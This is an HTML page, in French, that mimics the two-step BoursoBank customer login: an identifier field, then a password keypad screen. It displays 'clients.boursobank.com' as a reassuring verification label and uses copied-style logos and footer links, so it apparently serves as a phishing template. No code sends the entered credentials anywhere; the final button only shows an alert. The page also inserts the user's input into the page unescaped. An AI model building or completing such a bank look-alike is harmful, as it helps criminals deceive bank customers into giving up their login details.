<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire - Transition Identifiant à Mot de Passe</title>
    <style>
        /* Réutilisation des styles existants */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(to bottom, #f3f4fc, #eef4fc);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }
        .top-logo img {
            max-width: 200px;
        }
        .form-box {
            background: #ffffff;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            max-width: 500px;
            overflow: hidden;
            position: relative;
        }
        .header-bar {
            background: linear-gradient(to right, #d9007f, #ff007a);
            height: 10px;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
        }
        .form-content {
            padding: 50px;
        }
        .form-logo img {
            max-width: 50px;
            margin-bottom: 15px;
        }
        h1 {
            font-weight: 500;
            color: #003883;
            font-size: 1.3rem;
            margin-bottom: 10px;
        }
        .verification-box {
            color: #27ae60;
            font-size: 0.9rem;
            margin-bottom: 20px;
        }
        .circle-btn {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background: #ffffff;
            color: #003883;
            border: 2px solid #d9007f;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            margin: 10px;
            font-size: 1.2rem;
            cursor: pointer;
        }
        .circle-btn span {
            font-size: 0.6rem;
            color: #999;
        }
        .number-grid {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 10px;
            justify-items: center;
        }
        .password-dots {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 20px 0;
        }
        .dot {
            width: 15px;
            height: 15px;
            border-radius: 50%;
            background: #d9007f;
        }
        .footer-links a {
            color: #999;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Logo principal -->
        <div class="top-logo">
            <img src="rvb-logo-3000_original_original-1024x188.png" alt="Logo Principal">
        </div>

        <!-- Boîte du formulaire -->
        <div class="form-box">
            <div class="header-bar"></div>
            <div class="form-content" id="formContent">
                <!-- Logo secondaire -->
                <div class="form-logo">
                    <img src="instruments-logo-4677.png" alt="Logo Secondaire">
                </div>
                <!-- Titre -->
                <h1 id="formTitle">Mon identifiant</h1>
                <div class="verification-box">
                    clients.boursobank.com
                </div>
                <!-- Zone pour l'identifiant ou mot de passe -->
                <div id="formSection">
                    <!-- Identifiant -->
                    <input type="text" id="userInput" class="input-line" placeholder="Entrez votre identifiant">
                </div>
                <button class="btn" id="nextButton" onclick="nextStep()">Suivant</button>
            </div>
        </div>

        <!-- Footer -->
        <div class="footer-links">
            <a href="#">Aide</a> / <a href="#">Opposition</a> / <a href="#">Sécurité</a>
        </div>
    </div>

    <script>
        function nextStep() {
            const formContent = document.getElementById("formContent");
            const input = document.getElementById("userInput").value;

            // Effacer le contenu existant
            formContent.innerHTML = `
                <div class="form-logo">
                    <img src="instruments-logo-4677.png" alt="Logo Secondaire">
                </div>
                <h1>Mon mot de passe</h1>
                <div class="verification-box">
                    ${input}
                </div>
                <div class="password-dots">
                    <div class="dot"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                </div>
                <div class="number-grid">
                    ${[...Array(10).keys()].map(
                        num =>
                            `<button class="circle-btn">${num}<span>${"ABC DEF GHI JKL MNO PQR STU VWX YZ".split(
                                " "
                            )[num]}</span></button>`
                    ).join("")}
                </div>
                <label style="margin: 10px; color: #999;">
                    <input type="checkbox"> Activer la vocalisation
                </label>
                <button class="btn" onclick="alert('Mot de passe enregistré !')">Se connecter</button>
            `;
        }
    </script>
</body>
</html>
